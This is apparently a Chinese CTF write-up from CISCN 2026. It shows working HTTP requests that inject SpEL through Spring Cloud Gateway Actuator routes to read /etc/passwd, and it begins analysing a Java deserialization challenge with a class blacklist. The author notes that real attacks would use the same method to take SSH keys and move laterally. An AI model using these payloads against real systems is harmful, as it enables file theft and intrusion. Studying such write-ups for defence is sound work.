+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/111.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/112.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>Allow里面有POST，说明 Gateway Actuator 可写</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/113.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>确认可刷新，</p>
+<h3 id="关闭限制性属性访问器"><a href="#关闭限制性属性访问器" class="headerlink" title="关闭限制性属性访问器"></a>关闭限制性属性访问器</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/gateway/routes/s1</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8092
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>473
+
+<span class="language-coffeescript">&#123;</span>
+<span class="language-coffeescript">  <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;s1&quot;</span>,</span>
+<span class="language-coffeescript">  <span class="hljs-string">&quot;uri&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8092&quot;</span>,</span>
+<span class="language-coffeescript">  <span class="hljs-string">&quot;predicates&quot;</span>:[</span>
+<span class="language-coffeescript">    &#123;</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;Path&quot;</span>,</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;args&quot;</span>:&#123;<span class="hljs-string">&quot;_genkey_0&quot;</span>:<span class="hljs-string">&quot;/s1/**&quot;</span>&#125;</span>
+<span class="language-coffeescript">    &#125;</span>
+<span class="language-coffeescript">  ],</span>
+<span class="language-coffeescript">  <span class="hljs-string">&quot;filters&quot;</span>:[</span>
+<span class="language-coffeescript">    &#123;</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;SetPath&quot;</span>,</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;args&quot;</span>:&#123;<span class="hljs-string">&quot;_genkey_0&quot;</span>:<span class="hljs-string">&quot;/actuator&quot;</span>&#125;</span>
+<span class="language-coffeescript">    &#125;,</span>
+<span class="language-coffeescript">    &#123;</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;AddResponseHeader&quot;</span>,</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;args&quot;</span>:&#123;</span>
+<span class="language-coffeescript">        <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;X-Out&quot;</span>,</span>
+<span class="language-coffeescript">        <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;@systemProperties[<span class="hljs-string">&#x27;spring.cloud.gateway.server.webflux.restrictive-property-accessor.enabled&#x27;</span>]=<span class="hljs-string">&#x27;false&#x27;</span>&#125;</span>&quot;</span></span>
+<span class="language-coffeescript">      &#125;</span>
+<span class="language-coffeescript">    &#125;</span>
+<span class="language-coffeescript">  ]</span>
+<span class="language-coffeescript">&#125;</span></code></pre>
+
+<p>返回201</p>
+<h3 id="改目录"><a href="#改目录" class="headerlink" title="改目录"></a>改目录</h3><p>将资源目录，改成系统根目录，这样访问文件时访问的是根目录</p>
+<pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/gateway/routes/s2</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8092
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>443
+
+<span class="language-coffeescript">&#123;</span>
+<span class="language-coffeescript">  <span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;s2&quot;</span>,</span>
+<span class="language-coffeescript">  <span class="hljs-string">&quot;uri&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8092&quot;</span>,</span>
+<span class="language-coffeescript">  <span class="hljs-string">&quot;predicates&quot;</span>:[</span>
+<span class="language-coffeescript">    &#123;</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;Path&quot;</span>,</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;args&quot;</span>:&#123;<span class="hljs-string">&quot;_genkey_0&quot;</span>:<span class="hljs-string">&quot;/s2/**&quot;</span>&#125;</span>
+<span class="language-coffeescript">    &#125;</span>
+<span class="language-coffeescript">  ],</span>
+<span class="language-coffeescript">  <span class="hljs-string">&quot;filters&quot;</span>:[</span>
+<span class="language-coffeescript">    &#123;</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;SetPath&quot;</span>,</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;args&quot;</span>:&#123;<span class="hljs-string">&quot;_genkey_0&quot;</span>:<span class="hljs-string">&quot;/actuator&quot;</span>&#125;</span>
+<span class="language-coffeescript">    &#125;,</span>
+<span class="language-coffeescript">    &#123;</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;AddResponseHeader&quot;</span>,</span>
+<span class="language-coffeescript">      <span class="hljs-string">&quot;args&quot;</span>:&#123;</span>
+<span class="language-coffeescript">        <span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;X-Out&quot;</span>,</span>
+<span class="language-coffeescript">        <span class="hljs-string">&quot;value&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;@resourceHandlerMapping.urlMap[<span class="hljs-string">&#x27;/webjars/**&#x27;</span>].locationValues[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;file:/&#x27;</span>&#125;</span>&quot;</span></span>
+<span class="language-coffeescript">      &#125;</span>
+<span class="language-coffeescript">    &#125;</span>
+<span class="language-coffeescript">  ]</span>
+<span class="language-coffeescript">&#125;</span></code></pre>
+
+<p>返回201</p>
+<h3 id="重新初始化"><a href="#重新初始化" class="headerlink" title="重新初始化"></a>重新初始化</h3><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/actuator/gateway/routes/s3</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8092
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>443
+
+<span class="language-ruby">&#123;</span>
+<span class="language-ruby">  <span class="hljs-string">&quot;id&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;s3&quot;</span></span>,</span>
+<span class="language-ruby">  <span class="hljs-string">&quot;uri&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;http://127.0.0.1:8092&quot;</span></span>,</span>
+<span class="language-ruby">  <span class="hljs-string">&quot;predicates&quot;</span><span class="hljs-symbol">:</span>[</span>
+<span class="language-ruby">    &#123;</span>
+<span class="language-ruby">      <span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;Path&quot;</span></span>,</span>
+<span class="language-ruby">      <span class="hljs-string">&quot;args&quot;</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-string">&quot;_genkey_0&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/s3/**&quot;</span></span>&#125;</span>
+<span class="language-ruby">    &#125;</span>
+<span class="language-ruby">  ],</span>
+<span class="language-ruby">  <span class="hljs-string">&quot;filters&quot;</span><span class="hljs-symbol">:</span>[</span>
+<span class="language-ruby">    &#123;</span>
+<span class="language-ruby">      <span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;SetPath&quot;</span></span>,</span>
+<span class="language-ruby">      <span class="hljs-string">&quot;args&quot;</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-string">&quot;_genkey_0&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/actuator&quot;</span></span>&#125;</span>
+<span class="language-ruby">    &#125;,</span>
+<span class="language-ruby">    &#123;</span>
+<span class="language-ruby">      <span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;AddResponseHeader&quot;</span></span>,</span>
+<span class="language-ruby">      <span class="hljs-string">&quot;args&quot;</span><span class="hljs-symbol">:</span>&#123;</span>
+<span class="language-ruby">        <span class="hljs-string">&quot;name&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;X-Out&quot;</span></span>,</span>
+<span class="language-ruby">        <span class="hljs-string">&quot;value&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;<span class="hljs-variable">@resourceHandlerMapping</span>.urlMap[<span class="hljs-string">&#x27;/webjars/**&#x27;</span>].afterPropertiesSet <span class="hljs-string">?:</span> <span class="hljs-string">&#x27;ok&#x27;</span>&#125;</span>&quot;</span></span></span>
+<span class="language-ruby">      &#125;</span>
+<span class="language-ruby">    &#125;</span>
+<span class="language-ruby">  ]</span>
+<span class="language-ruby">&#125;</span></code></pre>
+
+<h3 id="刷新后访问文件"><a href="#刷新后访问文件" class="headerlink" title="刷新后访问文件"></a>刷新后访问文件</h3><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl.exe</span> -<span class="hljs-title">i</span> -<span class="hljs-title">X</span> <span class="hljs-title">POST</span> <span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">actuator</span>/<span class="hljs-title">gateway</span>/<span class="hljs-title">refresh</span></span>
+<span class="hljs-function"><span class="hljs-title">HTTP</span>/1.1 200 <span class="hljs-title">OK</span></span>
+<span class="hljs-function"><span class="hljs-title">content</span>-<span class="hljs-title">length</span>: 0</span></code></pre>
+
+<p>可以看到返回200，说明刷新成功，然后依次验证三条路由是否写入</p>
+<pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl.exe</span> -<span class="hljs-title">i</span> <span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">s1</span>   </span>
+<span class="hljs-function"><span class="hljs-title">HTTP</span>/1.1 200 <span class="hljs-title">OK</span></span>
+<span class="hljs-function"><span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>: <span class="hljs-title">application</span>/<span class="hljs-title">vnd.spring</span>-<span class="hljs-title">boot.actuator.v3</span>+<span class="hljs-title">json</span></span>
+<span class="hljs-function"><span class="hljs-title">Content</span>-<span class="hljs-title">Length</span>: 157</span>
+<span class="hljs-function"><span class="hljs-title">X</span>-<span class="hljs-title">Out</span>: <span class="hljs-title">false</span></span>
+<span class="hljs-function"></span>
+<span class="hljs-function">&#123;&quot;<span class="hljs-title">_links</span>&quot;:&#123;&quot;<span class="hljs-title">self</span>&quot;:&#123;&quot;<span class="hljs-title">href</span>&quot;:&quot;<span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">actuator</span>&quot;,&quot;<span class="hljs-title">templated</span>&quot;:<span class="hljs-title">false</span>&#125;,&quot;<span class="hljs-title">gateway</span>&quot;:&#123;&quot;<span class="hljs-title">href</span>&quot;:&quot;<span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">actuator</span>/<span class="hljs-title">gateway</span>&quot;,&quot;<span class="hljs-title">templated</span>&quot;:<span class="hljs-title">false</span>&#125;&#125;&#125;</span>
+<span class="hljs-function"><span class="hljs-title">D</span>:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl.exe</span> -<span class="hljs-title">i</span> <span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">s2</span></span>
+<span class="hljs-function"><span class="hljs-title">HTTP</span>/1.1 200 <span class="hljs-title">OK</span></span>
+<span class="hljs-function"><span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>: <span class="hljs-title">application</span>/<span class="hljs-title">vnd.spring</span>-<span class="hljs-title">boot.actuator.v3</span>+<span class="hljs-title">json</span></span>
+<span class="hljs-function"><span class="hljs-title">Content</span>-<span class="hljs-title">Length</span>: 157</span>
+<span class="hljs-function"><span class="hljs-title">X</span>-<span class="hljs-title">Out</span>: <span class="hljs-title">file</span>:/</span>
+<span class="hljs-function"></span>
+<span class="hljs-function">&#123;&quot;<span class="hljs-title">_links</span>&quot;:&#123;&quot;<span class="hljs-title">self</span>&quot;:&#123;&quot;<span class="hljs-title">href</span>&quot;:&quot;<span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">actuator</span>&quot;,&quot;<span class="hljs-title">templated</span>&quot;:<span class="hljs-title">false</span>&#125;,&quot;<span class="hljs-title">gateway</span>&quot;:&#123;&quot;<span class="hljs-title">href</span>&quot;:&quot;<span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">actuator</span>/<span class="hljs-title">gateway</span>&quot;,&quot;<span class="hljs-title">templated</span>&quot;:<span class="hljs-title">false</span>&#125;&#125;&#125;</span>
+<span class="hljs-function"><span class="hljs-title">D</span>:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl.exe</span> -<span class="hljs-title">i</span> <span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">s3</span></span>
+<span class="hljs-function"><span class="hljs-title">HTTP</span>/1.1 200 <span class="hljs-title">OK</span></span>
+<span class="hljs-function"><span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>: <span class="hljs-title">application</span>/<span class="hljs-title">vnd.spring</span>-<span class="hljs-title">boot.actuator.v3</span>+<span class="hljs-title">json</span></span>
+<span class="hljs-function"><span class="hljs-title">Content</span>-<span class="hljs-title">Length</span>: 157</span>
+<span class="hljs-function"><span class="hljs-title">X</span>-<span class="hljs-title">Out</span>: <span class="hljs-title">ok</span></span>
+<span class="hljs-function"></span>
+<span class="hljs-function">&#123;&quot;<span class="hljs-title">_links</span>&quot;:&#123;&quot;<span class="hljs-title">self</span>&quot;:&#123;&quot;<span class="hljs-title">href</span>&quot;:&quot;<span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">actuator</span>&quot;,&quot;<span class="hljs-title">templated</span>&quot;:<span class="hljs-title">false</span>&#125;,&quot;<span class="hljs-title">gateway</span>&quot;:&#123;&quot;<span class="hljs-title">href</span>&quot;:&quot;<span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">actuator</span>/<span class="hljs-title">gateway</span>&quot;,&quot;<span class="hljs-title">templated</span>&quot;:<span class="hljs-title">false</span>&#125;&#125;&#125;</span></code></pre>
+
+<p>看到X-Out: false、X-Out: file:&#x2F;、X-Out: ok即可</p>
+<p>访问文件即可</p>
+<pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">desktop</span>\<span class="hljs-title">work_place</span>\<span class="hljs-title">Web</span>&gt;<span class="hljs-title">curl.exe</span> -<span class="hljs-title">i</span> <span class="hljs-title">http</span>://127.0.0.1:8092/<span class="hljs-title">webjars</span>/<span class="hljs-title">etc</span>/<span class="hljs-title">passwd</span></span>
+<span class="hljs-function"><span class="hljs-title">HTTP</span>/1.1 200 <span class="hljs-title">OK</span></span>
+<span class="hljs-function"><span class="hljs-title">Last</span>-<span class="hljs-title">Modified</span>: <span class="hljs-title">Thu</span>, 30 <span class="hljs-title">Apr</span> 2026 09:36:42 <span class="hljs-title">GMT</span></span>
+<span class="hljs-function"><span class="hljs-title">Content</span>-<span class="hljs-title">Length</span>: 1422</span>
+<span class="hljs-function"><span class="hljs-title">Content</span>-<span class="hljs-title">Type</span>: <span class="hljs-title">application</span>/<span class="hljs-title">octet</span>-<span class="hljs-title">stream</span></span>
+<span class="hljs-function"><span class="hljs-title">Accept</span>-<span class="hljs-title">Ranges</span>: <span class="hljs-title">bytes</span></span>
+<span class="hljs-function"></span>
+<span class="hljs-function"><span class="hljs-title">root:x</span>:0:0:<span class="hljs-title">root</span>:/<span class="hljs-title">root</span>:/<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span></span>
+<span class="hljs-function">...</span></code></pre>
+
+<p>实战应该就是通过这种拿配置文件，然后看能不能拿ssh密钥获得shell继续横向</p>
+<h1 id="web-本地复现分析"><a href="#web-本地复现分析" class="headerlink" title="web(本地复现分析)"></a>web(本地复现分析)</h1><h2 id="JavaUnbound"><a href="#JavaUnbound" class="headerlink" title="JavaUnbound"></a>JavaUnbound</h2><p>题目：真的不是很难，绕过一下就可以了</p>
+<p>打开浏览器回显hello world，给了jar包，jadx分析一下</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/img/ciscn2026/2.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<h3 id="SecurityConfig"><a href="#SecurityConfig" class="headerlink" title="SecurityConfig"></a>SecurityConfig</h3><pre><code class="hljs java"><span class="hljs-comment">//BOOT-INF/classes/com/ezjava/config/SecurityConfig.class</span>
+<span class="hljs-meta">@Configuration</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> &#123;
+    <span class="hljs-meta">@PostConstruct</span>
+    <span class="hljs-comment">//在依赖注入完成后、类正式投入使用前自动执行一次</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;
+        System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomSecurityManager</span>());
+        <span class="hljs-comment">//设置全局的安全管理器</span>
+    &#125;
+&#125;</code></pre>
+
+<h3 id="CustomSecurityManager"><a href="#CustomSecurityManager" class="headerlink" title="CustomSecurityManager"></a>CustomSecurityManager</h3><pre><code class="hljs java"><span class="hljs-comment">//BOOT-INF/classes/com/ezjava/config/CustomSecurityManager.class</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomSecurityManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SecurityManager</span> &#123;
+    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// java.lang.SecurityManager</span>
+    <span class="hljs-comment">//重写检查网络连接的方法</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkConnect</span><span class="hljs-params">(String host, <span class="hljs-type">int</span> port, Object context)</span> &#123;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> InetAddress.getByName(host);<span class="hljs-comment">// 解析主机名</span>
+            <span class="hljs-keyword">if</span> (!addr.isLoopbackAddress()) &#123;<span class="hljs-comment">// 判断是否为回环地址</span>
+                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>(<span class="hljs-string">&quot;Network access denied: &quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + port);
+                <span class="hljs-comment">// 不是本地地址就报错</span>
+            &#125;
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecurityException</span>(<span class="hljs-string">&quot;Network access denied: &quot;</span> + host + <span class="hljs-string">&quot;:&quot;</span> + port);
+            <span class="hljs-comment">// 解析失败也报错</span>
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>禁止该程序访问除本地回环地址（127.0.0.1）以外的所有网络连接</p>
+<p>访问本地文件没有专门拦截，但是禁止访问外部网站，那么就不能进行DNSLog、外带 HTTP 请求、连外网回显、反弹 shell 到外部 VPS这种了</p>
+<h3 id="HelloController"><a href="#HelloController" class="headerlink" title="HelloController"></a>HelloController</h3><pre><code class="hljs java"><span class="hljs-comment">//BOOT-INF/classes/com/ezjava/controller/HelloController.class</span>
+
+<span class="hljs-meta">@RestController</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;
+    <span class="hljs-meta">@GetMapping(&#123;&quot;/&quot;&#125;)</span>
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello world&quot;</span>;
+    &#125;
+
+    <span class="hljs-meta">@PostMapping(&#123;&quot;/&quot;&#125;)</span>
+    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> <span class="hljs-type">byte</span>[] data)</span> &#123;<span class="hljs-comment">//整个 body 按原始字节接收成 byte[] data</span>
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);
+            <span class="hljs-comment">//把客户端传来的原始字节，当作一个文件来读</span>
+            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeObjectInputStream</span>(bais);
+            <span class="hljs-comment">//SafeObjectInputStream这里做了防护</span>
+            ois.readObject();
+            ois.close();
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;deserialization success&quot;</span>;
+            <span class="hljs-comment">//反序列化成功，不一定有命令执行回显</span>
+        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;
+            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);
+        &#125;
+    &#125;
+&#125;</code></pre>
+
+<p>可以看到这里有deserialize，可以打反序列化链</p>
+<h3 id="SafeObjectInputStream"><a href="#SafeObjectInputStream" class="headerlink" title="SafeObjectInputStream"></a>SafeObjectInputStream</h3><p>看一下它的这个防护</p>
+<pre><code class="hljs java"><span class="hljs-comment">//BOOT-INF/classes/com/ezjava/utils/SafeObjectInputStream.class</span>
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SafeObjectInputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectInputStream</span> &#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = &#123;<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>, <span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="hljs-string">&quot;java.security.SignedObject&quot;</span>, <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>, <span class="hljs-string">&quot;javax.management.remote.rmi.RMIConnector&quot;</span>&#125;;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SafeObjectInputStream</span><span class="hljs-params">(InputStream inputStream)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-built_in">super</span>(inputStream);
+    &#125;
+
+    <span class="hljs-meta">@Override</span> <span class="hljs-comment">// java.io.ObjectInputStream</span>
+    <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;
+        <span class="hljs-comment">//重写 resolveClass，出现黑名单类 → 直接抛异常</span>
+        <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> desc.getName();
+        <span class="hljs-keyword">for</span> (String forbiddenPackage : blacklist) &#123;
+            <span class="hljs-keyword">if</span> (className.startsWith(forbiddenPackage)) &#123;
+                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidClassException</span>(<span class="hljs-string">&quot;Unauthorized deserialization attempt&quot;</span>, className);
+            &#125;
+        &#125;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.resolveClass(desc);
+    &#125;
+&#125;</code></pre>
+
+<p>定义了一个黑名单，想拦经典危险类</p>
+<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] blacklist = &#123;
+    <span class="hljs-string">&quot;java.lang.Runtime&quot;</span>,
+    <span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,
+    <span class="hljs-comment">//命令执行</span>
+    <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,
+    <span class="hljs-string">&quot;java.security.SignedObject&quot;</span>,
+    <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>,
+    <span class="hljs-string">&quot;javax.management.remote.rmi.RMIConnector&quot;</span>
+        <span class="hljs-comment">//常见包装或远程触发点</span>
+&#125;;</code></pre>
+
+<p>1.直接执行命令类。 Java 执行系统命令的最直接方式</p>
+<pre><code class="hljs java">java.lang.Runtime
+java.lang.ProcessBuilder</code></pre>
+
+<p>2.字节码加载与动态注入</p>
+<pre><code class="hljs java">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></pre>
+
